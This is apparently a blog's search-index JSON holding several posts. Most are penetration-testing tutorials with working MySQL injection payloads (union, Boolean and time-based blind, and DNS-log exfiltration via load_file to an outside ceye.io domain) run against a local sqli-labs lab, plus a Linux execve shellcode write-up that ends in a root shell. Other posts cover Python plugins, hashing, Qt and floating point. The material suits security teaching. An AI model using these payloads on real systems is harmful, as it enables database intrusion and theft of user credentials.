key’s row data into the temporary table. Additional Information: These three functions are commonly used in error-based injections.","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"MySQL Error-Based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/MySQL-Error-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Error-Based-SQL-Injection/"}],"tags":[]},{"title":"DNS Log Blind SQL Injection","slug":"SQLInjectionDnsLog","date":"2016-11-18T15:47:59.000Z","updated":"2023-10-19T14:53:51.423Z","comments":true,"path":"2016/11/18/SQLInjectionDnsLog/","link":"","permalink":"http://example.com/2016/11/18/SQLInjectionDnsLog/","excerpt":"","text":"Sometimes, when injecting, you may not get direct feedback, or you may not be able to use time-based blind injection. In such cases, you can use out-of-band channels, which means using other protocols or channels, such as HTTP requests, DNS resolution, SMB services, to exfiltrate data. DNS log blind injection can reduce the number of requests sent and achieve injection with direct feedback. DNS log: It stores domain name information on the DNS server, recording user access information for domains like www.xxx.com. Conditions for utilization: secure_file_priv in mysql.ini must be empty. If secure_file_priv is null, importing and exporting are not allowed. If secure_file_priv is set to &#x2F;tmp, importing and exporting can only be done in the &#x2F;tmp directory. When secure_file_priv is empty, there are no restrictions, and importing and exporting are allowed. Example: 1?id=1&#x27; and load_file(concat(&#x27;\\\\&#x27;, (select database()), &#x27;.27epx0.ceye.io\\abc&#x27;))--+&quot;","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"DNS Log Blind SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection/"}],"tags":[]},{"title":"Time-Based Blind SQL Injection","slug":"SQLInjectionTimeBasedBlind","date":"2016-10-29T02:31:42.000Z","updated":"2023-10-19T00:37:49.750Z","comments":true,"path":"2016/10/28/SQLInjectionTimeBasedBlind/","link":"","permalink":"http://example.com/2016/10/28/SQLInjectionTimeBasedBlind/","excerpt":"","text":"Time-Based Blind SQL Injection Steps: First, check if an injection vulnerability exists. Next, determine the injection type: character-based, numeric-based, or search-based. Determine the available injection method; in this case, union injection and Boolean-based blind injection are not available:123?id=1&#x27; and 1=1 %23 (Page response is normal)?id=1&#x27; and 1=2 %23 (Page response is normal)?id=1&#x27; and sleep(5) %23 Page experiences a 5-second delay, indicating the sleep function is injected into the database, confirming the presence of time-based blind injection. Start by obtaining the length of the database name:12?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 (5-second delay)?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 (No 5-second delay) This indicates that the database name has a length of 8 characters. Proceed to retrieve the database name character by character:1?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;n),sleep(5),1) %23 These steps describe a method for performing time-based blind SQL injection to extract information about the database, such as the length of the database name and the characters that make up the name. Example of Time-Based Blind SQL Injection Operation:123456789101112http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; 没有任何反应http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot; 没有任何反应http://127.0.0.1/sqli-labs-master/Less-9/?id=1\\ 没有任何反应http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and 1=1 --+ 没有任何反应http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and sleep(5) %23 5秒钟后响应,说明是字符型盲注http://127.0.0.1/sqli-labs-master/Less-9/?id=1 and sleep(5) %23 响应的比较快,说明不是数字型盲注http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 延时5秒http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 不延时5秒http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;114),sleep(5),1) %23 延时5秒http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;115),sleep(5),1) %23 不延时5秒,得出结论,第一个字符是s,以此类推http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;3,sleep(5),1) --+ 延时5秒http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;4,sleep(5),1) --+ 不延时5秒","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Time-Based Blind SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection/"}],"tags":[]},{"title":"Boolean Blind SQL Injection","slug":"SQLInjectionBooleanBlind","date":"2016-10-28T00:20:57.000Z","updated":"2023-10-19T00:29:50.667Z","comments":true,"path":"2016/10/27/SQLInjectionBooleanBlind/","link":"","permalink":"http://example.com/2016/10/27/SQLInjectionBooleanBlind/","excerpt":"","text":"Boolean Blind SQL Injection Method First, obtain the length of the database name: 1?id=1&#x27; and (length(database()))&gt;n --+ Next, retrieve the database name character by character: 1?id=1&#x27; and (ascii(substr(database(),1,1))&gt;n) --+ Note: To determine the character at a specific position, you can use a binary search method.To obtain the second character of the database name, simply change the position in the “substr” function. Use Burp Suite’s Intruder module to iterate through the possibilities. Obtain the number of tables: 1?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3 Retrieve the length of the tables.These steps outline a method for conducting a blind Boolean-based SQL injection to gather information about a database, such as the database name and the number of tables. Example of Boolean Blind SQL Injection Operation1234567891011121314http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=1 --+ correcthttp://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=2 --+ errorhttp://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 3 --+ correcthttp://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 4 --+ errorhttp://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; union select 1,2,3 --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;7 --+ correct database name&#x27;s length &lt;=8http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;8 --+ errorhttp://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;114) --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;115) --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3 --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 4 --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 100) --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 101) --+","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Boolean Blind Sql Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection/"}],"tags":[]},{"title":"Union Sql Injection Detection Methods","slug":"SQLInjectionUnion","date":"2016-10-24T23:11:44.000Z","updated":"2023-10-19T00:46:23.925Z","comments":true,"path":"2016/10/24/SQLInjectionUnion/","link":"","permalink":"http://example.com/2016/10/24/SQLInjectionUnion/","excerpt":"","text":"Union Sql Injection Detection Methods First, check for the existence of an SQL injection vulnerability. Then, determine the injection type: character-based, numeric-based, or search-based. Use “order by” to further identify the number of columns:12?id=1&#x27; order by 3 --+ (normal)?id=1&#x27; order by 4 --+ (error) Once the number of columns is determined using “order by,” proceed to replace the display position with some MySQL functions. Retrieve the tables in the current database:1?id=-1&#x27; union select 1, group_concat(&#x27;&lt;br&gt;&#x27;, table_name), version() from information_schema.tables where table_schema=database()--+ After obtaining the tables, retrieve the columns in those tables:1?id=-1&#x27; union select 1, group_concat(&#x27;&lt;br&gt;&#x27;, column_name), version() from information_schema.columns where able_schema=database() and table_name=&#x27;users&#x27;--+ Retrieve the data:1?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;, username), group_concat(&#x27;|&#x27;, password) from users--+ These steps describe how an attacker can detect and exploit a SQL injection vulnerability to extract information from a database. Example of Union Sql Injection Operation123456789http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+ correcthttp://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+ errorhttp://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),version() --+http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;&lt;br&gt;&#x27;,table_name) ,version() from information_schema.tables where table_schema=database()--+http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;&lt;br&gt;&#x27;,column_name),version() from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, username,password from users --+http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;,username),group_concat(&#x27;|&#x27;,password) from users --+","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Union Sql Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection/"}],"tags":[]},{"title":"Search-Based SQL Injection Detection","slug":"SQLInjectionSearch-Based","date":"2016-10-23T23:57:41.000Z","updated":"2023-10-18T22:54:24.993Z","comments":true,"path":"2016/10/23/SQLInjectionSearch-Based/","link":"","permalink":"http://example.com/2016/10/23/SQLInjectionSearch-Based/","excerpt":"","text":"Search-Based Injection Detection Methods: Input the search keyword: 1keyword&#x27; If an error occurs, there’s a high probability of a vulnerability. Input the search keyword: 1keyword%&#x27; If an error occurs, there’s a high probability of a vulnerability. Input the search keyword: 1keyword% &#x27;and 1=1 and &#x27;%&#x27;=&#x27; Observe the response. Input the search keyword: 1keyword% &#x27;and 1=2 and &#x27;%&#x27;=&#x27; Observe the response. Search-Based Injection Detection Statements: 123&#x27;and 1=1 and &#x27;%&#x27;=&#x27;%&#x27; and 1=1--&#x27;%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Search-Based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection/"}],"tags":[]},{"title":"Character-based SQL Injection","slug":"SQLInjectionCharacter","date":"2016-10-21T01:55:22.000Z","updated":"2023-10-18T22:55:32.715Z","comments":true,"path":"2016/10/20/SQLInjectionCharacter/","link":"","permalink":"http://example.com/2016/10/20/SQLInjectionCharacter/","excerpt":"","text":"Detection of character-based SQL Injection: 12http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Character-based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection/"}],"tags":[]},{"title":"Detection of Numeric-based SQL Injection","slug":"SQLInjectionNumberBased","date":"2016-10-19T01:02:42.000Z","updated":"2023-10-18T22:54:14.840Z","comments":true,"path":"2016/10/18/SQLInjectionNumberBased/","link":"","permalink":"http://example.com/2016/10/18/SQLInjectionNumberBased/","excerpt":"","text":"Detection of numeric-based SQL injection: 1http://127.0.0.1/sqli-labs-master/Less-2/?id=2-1","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Numeric-based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Numeric-based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Numeric-based-SQL-Injection/"}],"tags":[]},{"title":"A Simple Plugin System by Python","slug":"SimplePluginSystemByPython","date":"2011-10-22T20:41:33.000Z","updated":"2023-10-18T21:50:41.991Z","comments":true,"path":"2011/10/22/SimplePluginSystemByPython/","link":"","permalink":"http://example.com/2011/10/22/SimplePluginSystemByPython/","excerpt":"","text":"Due to the requirements of my work, I needed to design an open software system, and immediately thought of the Python language. As a result, I designed a simple and easily extensible plugin system. Here’s the code: 12345678910111213141516171819202122232425262728293031323334353637383940414243#main.pyimport importlibclass PluginManager: def __init__(self): self.plugins = [] self.func_name = &quot;MyPlugin&quot; def load_plugin(self, plugin_name): try: plugin_module = importlib.import_module(f&#x27;plugins.&#123;plugin_name&#125;&#x27;) plugin_instance = getattr(plugin_module, self.func_name)() self.plugins.append(plugin_instance) print(f&quot;plugin &#123;plugin_name&#125; loaded.&quot;) except ImportError: print(f&quot;Load plugin &#123;plugin_name&#125; failed.&quot;) def run_plugins(self): for plugin in self.plugins: plugin.run()if __name__ == &quot;__main__&quot;: manager = PluginManager() while True: print(&quot;1. Add Plugin&quot;) print(&quot;2. Run Plugin&quot;) print(&quot;3. Quit&quot;) choice = input(&quot;Your Select: &quot;) if choice == &quot;1&quot;: plugin_name = input(&quot;Please input the name of plugin: &quot;) manager.load_plugin(plugin_name) elif choice == &quot;2&quot;: manager.run_plugins() elif choice == &quot;3&quot;: break Then, you create a directory named ‘plugins.’ In this directory, you can add your plugin, which must define a class named ‘MyPlugin’ and must have a function named ‘run’. Here is the simple code: 1234567#my_pluginclass MyPlugin: def __init__(self): pass def run(self): print(&quot;MyPlugin is running&quot;) The following is the running process: 123456789101112131415161. Add Plugin2. Run Plugin3. QuitYour Select: 1Please input the name of plugin: my_pluginplugin my_plugin loaded.1. Add Plugin2. Run Plugin3. QuitYour Select: 2MyPlugin is running1. Add Plugin2. Run Plugin3. QuitYour Select: 3PS C:\\Users\\xxx\\Desktop\\yyy\\plugin-system&gt; You can use this model to design a big and an opened software system.","categories":[{"name":"System Architecture","slug":"System-Architecture","permalink":"http://example.com/categories/System-Architecture/"},{"name":"Plugin Pattern","slug":"System-Architecture/Plugin-Pattern","permalink":"http://example.com/categories/System-Architecture/Plugin-Pattern/"}],"tags":[]},{"title":"Shellcode Written in Linux","slug":"shellcodewrite","date":"2011-10-16T15:54:47.000Z","updated":"2023-10-17T16:05:08.840Z","comments":true,"path":"2011/10/16/shellcodewrite/","link":"","permalink":"http://example.com/2011/10/16/shellcodewrite/","excerpt":"","text":"Before you start learning shellcode development, please install NASM on your Linux system. Here’s the shellcode code: 12345678910111213141516171819202122232425section .textglobal _start_start:jmp short callShellcodeshellcode:pop esi ; Pop &#x27;/bin/sh&#x27; from the stack into esixor eax, eax ; Set eax to NULLmov byte [esi + 7], al ; Null-terminate &#x27;/bin/sh&#x27; using the low byte of eaxlea ebx, [esi] ; Load the address of &#x27;/bin/sh&#x27; into ebxmov dword [esi + 8], ebxlea ecx, [esi + 8] ; Load the address of the argv array into ecxmov dword [esi + 12], eaxlea edx, [esi + 12] ; Load the address of the NULL terminator into edxmov al, 0x0b ; Set al to 0x0b, the system call number for execveint 0x80 ; Trigger the syscallcallShellcode:call shellcodedb &#x27;/bin/sh&#x27; After saving this code to a file named “shellx.asm,” you need to compile it using NASM to obtain the hexadecimal representation of the code. Use the following commands: 12nasm -f elf shellx.asmld -o shellx shellx.o -m elf_i386 This will generate a “shellx” file. However, it’s not executable yet. You’ll need to use the “objdump” command to extract the hexadecimal code. You can use a Bash script like this: 1234for i in $(objdump -d &quot;$1&quot; | tr &#x27;\\t&#x27; &#x27; &#x27; | tr &#x27; &#x27; &#x27;\\n&#x27; | egrep &#x27;^[0-9a-f]&#123;2&#125;$&#x27;); do echo -n &quot;\\x$i&quot;doneecho -e &quot;\\n&quot; To validate your assembly code, you’ll need a C program as follows: 1234567char code[] = &quot;\\xeb\\x18\\x5e\\x31\\xc0\\x88\\x46\\x07\\x8d\\x1e\\x89\\x5e\\x08\\x8d\\x4e\\x08\\x89\\x46\\x0c\\x8d\\x56\\x0c\\xb0\\x0b\\xcd\\x80\\xe8\\xe3\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68&quot;;int main(int argc, char **argv) &#123; int (*func)(); func = (int (*)()) code; (int)(*func)();&#125; Compile this code with the following command: 1gcc -g -o shellcodetest shellcodetest.c -m32 -z execstack This will produce an executable, “shellcodetest.” When you run it, you’ll get a shell with root privileges: 12345678root@kali:/home/kali/shellCode_train# ./shellcodetest# ls exit.asm hello shellcodetest shellx.asm exit.o hello.asm shellcodetest.c shellx.o getshellcode.sh hello.o shellx# whoami root#","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"shellcode","slug":"Penetration-Test/shellcode","permalink":"http://example.com/categories/Penetration-Test/shellcode/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"http://example.com/tags/shellcode/"}]},{"title":"How to compile asm to execute under Linux","slug":"nasmCompile","date":"2011-03-02T16:31:25.000Z","updated":"2023-10-17T15:39:39.176Z","comments":true,"path":"2011/03/02/nasmCompile/","link":"","permalink":"http://example.com/2011/03/02/nasmCompile/","excerpt":"","text":"Here is code snippet to show how to compile asm to execute under Linux: shellx.asm: 12345678910111213section .textglobal _start _start: mov edx,len mov ecx,msg mov ebx,1 mov eax,4 int 0x80 mov eax,1 int 0x80 section .datamsg db &#x27;Hello world&#x27;,0xa len equ $ - msg let’s start First step: 1vagrant@kali:~/Desktop/cdasm$ nasm -f elf64 shellx.asm Next step: 1vagrant@kali:~/Desktop/cdasm$ ld -s -o shellx shellx.o Execute : 1vagrant@kali:~/Desktop/cdasm$ ./shellx then output : 1Hello world","categories":[{"name":"Asm","slug":"Asm","permalink":"http://example.com/categories/Asm/"},{"name":"linux","slug":"Asm/linux","permalink":"http://example.com/categories/Asm/linux/"}],"tags":[{"name":"nasm","slug":"nasm","permalink":"http://example.com/tags/nasm/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"Compilation of Python Code Snippets for Hashing","slug":"pythonHash","date":"2011-01-16T15:47:24.000Z","updated":"2023-10-17T16:06:28.632Z","comments":true,"path":"2011/01/16/pythonHash/","link":"","permalink":"http://example.com/2011/01/16/pythonHash/","excerpt":"","text":"Performing relevant hashing operations is an essential skill in penetration testing. Here is a compilation of code snippets for common hash implementations in Python. md5 : 123456import hashlibmystring = input(&#x27;Enter String to hash: &#x27;)# Assumes the default UTF-8hash_object = hashlib.md5(mystring.encode())print(hash_object.hexdigest()) sha1: 12345import hashlibhash_object = hashlib.sha1(b&#x27;Hello World&#x27;)hex_dig = hash_object.hexdigest()print(hex_dig) SHA256: hashlib1234hash_object = hashlib.sha256(b&#x27;Hello World&#x27;)hex_dig = hash_object.hexdigest()print(hex_dig) sha512: 12345import hashlibinput = &#x27;test&#x27;hash = hashlib.sha512( str( input ).encode(&quot;utf-8&quot;) ).hexdigest()print(hash) DSA: 12345import hashlibhash_object = hashlib.new(&#x27;DSA&#x27;)hash_object.update(b&#x27;Hello World&#x27;)print(hash_object.hexdigest())","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"hash","slug":"Penetration-Test/hash","permalink":"http://example.com/categories/Penetration-Test/hash/"}],"tags":[{"name":"hash","slug":"hash","permalink":"http://example.com/tags/hash/"}]},{"title":"About information_schema in MySQL","slug":"information-schema","date":"2010-10-15T16:47:16.000Z","updated":"2023-10-18T22:55:07.983Z","comments":true,"path":"2010/10/15/information-schema/","link":"","permalink":"http://example.com/2010/10/15/information-schema/","excerpt":"","text":"The “information_schema“ is a system database in MySQL that contains metadata information about databases, tables, columns, indexes, users, permissions, and more within the MySQL server. It serves as an interface for querying metadata information in MySQL. This information is stored in tabular form within tables in the “information_schema” database, and users can retrieve metadata information by using SQL statements to query these tables. Here are some common tables in the ‘information_schema’ database: SCHEMATA: Stores information about all databases, including database names, character sets, etc. TABLES: Stores information about all tables, including table names, table types, engines, etc. COLUMNS: Stores information about all columns, including column names, column data types, column constraints, etc. STATISTICS: Stores information about all indexes, including index names, index types, the table where the index is located, index columns, etc. USER_PRIVILEGES: Stores information about user privileges, including user accounts, permissions, etc. By querying the tables in the information_schema database, you can obtain information about various aspects of databases, tables, columns, indexes, users, and permissions. This is very helpful for database management and maintenance. Next, let’s take a look at an example of finding key information through the information_schema database: Query information about the current user:1SELECT current_user(); Query information about the user for the current session:1SELECT session_user(); Get the path of the database:1SELECT @@datadir; Get the installation path of MySQL:1select @@basedir; Retrieve information about the operating system version:1SELECT @@version_compile_os;","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"About information_schema","slug":"Penetration-Test/MySQL/About-information-schema","permalink":"http://example.com/categories/Penetration-Test/MySQL/About-information-schema/"}],"tags":[]},{"title":"In Qt, how to transmit custom data using QAction::setData","slug":"QtSetData","date":"2010-05-02T03:16:09.000Z","updated":"2023-10-17T16:04:32.083Z","comments":true,"path":"2010/05/01/QtSetData/","link":"","permalink":"http://example.com/2010/05/01/QtSetData/","excerpt":"","text":"Recently, in a project, there was a need to transmit custom data using QAction::setData. I’ve searched online for a lot of information, but it’s all a bit vague, and none of them hit the mark. Some even provide solutions that completely contradict Qt’s principles. Below is an example code I wrote: Custom data:Here, taking a custom class as an example, the code is as follows: 123456789101112131415161718192021//.h#ifndef QNEWITEM_H#define QNEWITEM_H#include &lt;QObject&gt;class QNewItem : public QObject&#123;public: QNewItem(QObject *parent = 0); ~QNewItem(); bool setUserInfo(QString&amp; strName,qint16&amp; nAge);private: QString m_strName; qint16 m_nAge;&#125;;#endif // QNEWITEM_H 123456789101112131415161718192021222324252627282930//.cpp#include &quot;qnewitem.h&quot;QNewItem::QNewItem(QObject *parent): QObject(parent)&#123;&#125;QNewItem::~QNewItem()&#123;&#125;bool QNewItem::setUserInfo( QString&amp; strName,qint16&amp; nAge )&#123; bool bRet = false; do &#123; if( strName.isEmpty() || nAge &gt;200 &amp;&amp; nAge&lt;0 ) break; m_strName = strName; m_nAge = nAge; bRet = true; &#125; while (false); return bRet;&#125; At the beginning of the calling CPP file, you must declare it like this: 123#include &quot;qnewitem.h&quot;Q_DECLARE_METATYPE(QNewItem*) There’s not much else to say; when you look at the code, you’ll understand everything. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &quot;qnewitem.h&quot;Q_DECLARE_METATYPE(QNewItem*)customDefineDemo::customDefineDemo(QWidget *parent, Qt::WFlags flags): QMainWindow(parent, flags)&#123; ui.setupUi(this); connect(ui.pushButton , SIGNAL(clicked()),this,SLOT(onBtnClick()));&#125;customDefineDemo::~customDefineDemo()&#123;&#125;void customDefineDemo::onBtnClick()&#123; QMenu* pMenu = new QMenu(); QNewItem* pNewItem = new QNewItem(); qint16 nAge = 34; QVariant qv; do &#123; QAction* pPortraitView = new QAction(tr(&quot;New&quot;), this); QAction* pAddGroup = new QAction(tr(&quot;Open&quot;), this); QAction* pDeleteGroup = new QAction(tr(&quot;Save&quot;), this); pNewItem-&gt;setUserInfo(tr(&quot;Eric&quot;),nAge); pPortraitView-&gt;setData( QVariant::fromValue(pNewItem) ) ; connect(pPortraitView,SIGNAL(triggered()),this,SLOT(triggeredMenuSendMsgContact())); pMenu-&gt;addAction(pPortraitView); pMenu-&gt;addAction(pAddGroup); pMenu-&gt;addAction(pDeleteGroup); pMenu-&gt;exec(QCursor::pos()); &#125; while (false); if( pMenu != nullptr ) &#123; delete pMenu; pMenu = nullptr; &#125;&#125;void customDefineDemo::triggeredMenuSendMsgContact()&#123; QAction* pSendMsg= NULL; QNewItem* pObj = NULL; do &#123; pSendMsg=qobject_cast&lt;QAction*&gt;(sender()); pObj = pSendMsg-&gt;data().value&lt;QNewItem*&gt;(); &#125; while (false); if( pObj != nullptr ) &#123; delete pObj; pObj = nullptr; &#125;&#125;","categories":[{"name":"C/C++","slug":"C-C","permalink":"http://example.com/categories/C-C/"}],"tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"}]},{"title":"The confusing floating point problem","slug":"floatData","date":"2010-03-15T02:44:22.000Z","updated":"2023-10-17T03:44:56.325Z","comments":true,"path":"2010/03/14/floatData/","link":"","permalink":"http://example.com/2010/03/14/floatData/","excerpt":"","text":"Recently, I encountered an issue with floating-point numbers. code: 1fld dword ptr ds:[esi+1E4] and 1esi+1E4 = 02FCE9D4 The following is its memory: 102FCE9D4 00 C0 2B 45 00 C0 2B 45 00 00 00 00 00 00 00 00 .?E.?E........ After execution this code: 1fld dword ptr ds:[esi+1E4] watches: 1ST0 = 2748.00000000000. I would like to know how ST0 equals 2748? In the end, it’s all about the representation of floating-point numbers. According to the IEEE standard, the first bit is the sign bit, the next 8 bits represent the exponent, and the remaining 23 bits are the mantissa. Considering that it’s little-endian storage, the value of the number 00 C0 2B 45 is 452BC000, which is: 10100 0101 0010 1011 1100 0000 0000 0000 The first bit is 0, indicating it’s a positive number.The next 8 bits, which is 10001010, 8A, in decimal, is 138. 138 - 127 &#x3D; 11, indicating the exponent is 11 bits.And the remaining 23 bits have the value: 1010 1011 1100 0000 0000 0000 The leading bit, with the omitted 1, has a value of: 11010 1011 1100 0000 0000 0000 Above 11 bits for the exponent indicate that the position of the decimal point is: 11010 1011 1100 . 0000 0000 0000 Converting to hexadecimal, it’s ABC.000. Converting to decimal, it’s 2748.00000000.","categories":[{"name":"Others","slug":"Others","permalink":"http://example.com/categories/Others/"},{"name":"float data","slug":"Others/float-data","permalink":"http://example.com/categories/Others/float-data/"}],"tags":[{"name":"asm","slug":"asm","permalink":"http://example.com/tags/asm/"},{"name":"float","slug":"float","permalink":"http://example.com/tags/float/"},{"name":"binary","slug":"binary","permalink":"http://example.com/tags/binary/"}]},{"title":"Example program for code decompilation","slug":"codedecompilation","date":"2009-11-05T03:36:35.000Z","updated":"2023-10-17T03:45:59.598Z","comments":true,"path":"2009/11/04/codedecompilation/","link":"","permalink":"http://example.com/2009/11/04/codedecompilation/","excerpt":"","text":"Some time ago, a friend asked me to help reverse engineer something, extract its code, save it as an assembly file, and compile and run it in VC (Visual C++). asm file : 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364 .686p .model flat,c option casemap : none extern sprintf:proc extern strcat:proc .data ___security_cookie dd 0BB40E64Eh a02x_0 db &quot;%02X&quot; .code public 